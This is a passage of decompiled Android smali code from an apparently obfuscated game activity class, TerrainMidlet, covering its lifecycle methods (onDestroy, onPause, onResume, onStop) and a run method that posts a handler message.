    goto :goto_1

    :pswitch_1
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lleo/ma2/v9hp/TerrainMidlet;->s:Ljava/lang/Boolean;

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_0
        :pswitch_0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public onDestroy()V
    .locals 2

    const/4 v1, 0x0

    sget-object v0, Lleo/ma2/v9hp/TerrainMidlet;->m:Lleo/ma2/v9hp/CCanvas;

    if-eqz v0, :cond_0

    sput-object v1, Lleo/ma2/v9hp/TerrainMidlet;->m:Lleo/ma2/v9hp/CCanvas;

    :cond_0
    invoke-static {}, Lleo/ma2/v9hp/g;->a()V

    sput-object v1, Lay;->a:Lau;

    sput-object v1, Lay;->b:Lay;

    sput-object v1, Lai;->a:Lai;

    sget-object v0, Lat;->b:Lat;

    iput-object v1, v0, Lat;->a:Law;

    sput-object v1, Lat;->b:Lat;

    invoke-static {}, LaG;->a()LaG;

    move-result-object v0

    invoke-virtual {v0}, LaG;->b()V

    sput-object v1, LaG;->a:LaG;

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    return-void
.end method

.method public onResume()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    return-void
.end method

.method public onStop()V
    .locals 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "stop App"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method

.method public run()V
    .locals 2

    invoke-static {}, Landroid/os/Looper;->prepare()V

    iget-object v0, p0, Lleo/ma2/v9hp/TerrainMidlet;->w:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    return-void
.end method
